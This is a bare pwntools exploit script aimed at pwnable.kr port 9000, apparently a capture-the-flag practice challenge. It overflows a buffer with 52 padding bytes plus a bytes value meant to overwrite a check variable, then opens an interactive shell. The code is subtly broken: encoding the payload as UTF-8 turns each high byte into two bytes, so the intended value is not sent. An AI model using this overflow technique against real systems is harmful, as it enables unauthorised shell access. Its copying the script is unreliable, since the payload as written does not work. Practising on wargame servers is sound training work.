from pwn import *

io = remote('pwnable.kr',9000)
mybytes = ('aaaaaaaaaaaaabbbbbbbbbcccccccccccddddddddddddeeeeeee\xbe\xba\xfe\xca').encode('utf-8')
io.sendline(mybytes)

io.interactive()
